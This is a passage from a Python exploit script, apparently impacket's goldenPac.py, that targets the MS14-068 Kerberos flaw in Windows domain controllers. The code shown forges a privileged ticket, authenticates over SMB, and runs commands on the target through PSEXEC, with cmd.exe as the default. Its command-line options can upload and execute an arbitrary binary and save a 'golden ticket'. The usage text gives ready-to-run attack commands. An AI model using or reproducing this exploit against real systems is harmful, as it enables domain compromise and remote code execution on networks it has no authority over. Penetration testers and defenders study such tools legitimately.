                logging.info('%s found vulnerable!' % dc)
                break
            else:
                logging.info('%s seems not vulnerable (%s)' % (dc, exception))
        if exception is None:
            TGS = {}
            TGS['KDC_REP'] = tgsCIFS
            TGS['cipher'] = cipher
            TGS['oldSessionKey'] = oldSessionKeyCIFS
            TGS['sessionKey'] = sessionKeyCIFS
            from impacket.smbconnection import SMBConnection
            if self.__targetIp is None:
                s = SMBConnection('*SMBSERVER', self.__target)
            else:
                s = SMBConnection('*SMBSERVER', self.__targetIp)
            s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS, useCache=False)
            if self.__command != 'None':
                executer = PSEXEC(self.__command, username, domain, s, TGS, self.__copyFile)
                executer.run(self.__target)
if __name__ == '__main__':
    import argparse
    import sys
    try:
        import pyasn1
        from pyasn1.type.univ import noValue
    except ImportError:
        logging.critical('This module needs pyasn1 installed')
        logging.critical('You can get it from https://pypi.python.org/pypi/pyasn1')
        sys.exit(1)
    import datetime
    from calendar import timegm
    from time import strptime
    from impacket import version
    from impacket.dcerpc.v5 import samr
    from impacket.dcerpc.v5 import transport
    from impacket.krb5.types import Principal, Ticket, KerberosTime
    from impacket.krb5 import constants
    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError
    from impacket.krb5.asn1 import AS_REP, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, EncTGSRepPart, ETYPE_INFO2_ENTRY
    from impacket.krb5.crypto import Key
    from impacket.dcerpc.v5.ndr import NDRULONG
    from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
    from pyasn1.codec.der import decoder, encoder
    from Cryptodome.Hash import MD5
    print(version.BANNER)
    parser = argparse.ArgumentParser(add_help=True, description='MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the target or saves the TGT for later use.')
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('command', nargs='*', default=' ', help="command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. 'None' will not execute PSEXEC (handy if you just want to save the ticket)")
    parser.add_argument('-c', action='store', metavar='pathname', help='uploads the filename for later execution, arguments are passed in the command option')
    parser.add_argument('-w', action='store', metavar='pathname', help='writes the golden ticket in CCache format into the <pathname> file')
    parser.add_argument('-dc-ip', action='store', metavar='ip address', help='IP Address of the domain controller (needed to get the users SID). If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-ip', action='store', metavar='ip address', help='IP Address of the target host you want to attack. If omitted it will use the targetName parameter')
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='NTLM hashes, format is LMHASH:NTHASH')
    if len(sys.argv) == 1:
        parser.print_help()
        print('\nExamples: ')
        print('\tpython goldenPac domain.net/normaluser@domain-host\n')
        print('\tthe password will be asked, or\n')
        print('\tpython goldenPac.py domain.net/normaluser:mypwd@domain-host\n')
        print('\tif domain.net and/or domain-machine do not resolve, add them')
        print('\tto the hosts file or explicitly specify the domain IP (e.g. 1.1.1.1) and target IP:\n')
        print('\tpython goldenPac.py -dc-ip 1.1.1.1 -target-ip 2.2.2.2 domain.net/normaluser:mypwd@domain-host\n')
        print('\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn')
        print('\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n')
        sys.exit(1)
    options = parser.parse_args()
    logger.init(options.ts)
    (domain, username, password, address) = parse_target(options.target)
    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
    if password == '' and username != '' and (options.hashes is None):
        from getpass import getpass
        password = getpass('Password:')
    commands = ' '.join(options.command)
    if commands == ' ':
        commands = 'cmd.exe'
    dumper = MS14_068(address, options.target_ip, username, password, domain, options.hashes, commands, options.c, options.w, options.dc_ip)
    try:
        dumper.exploit()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.critical(str(e))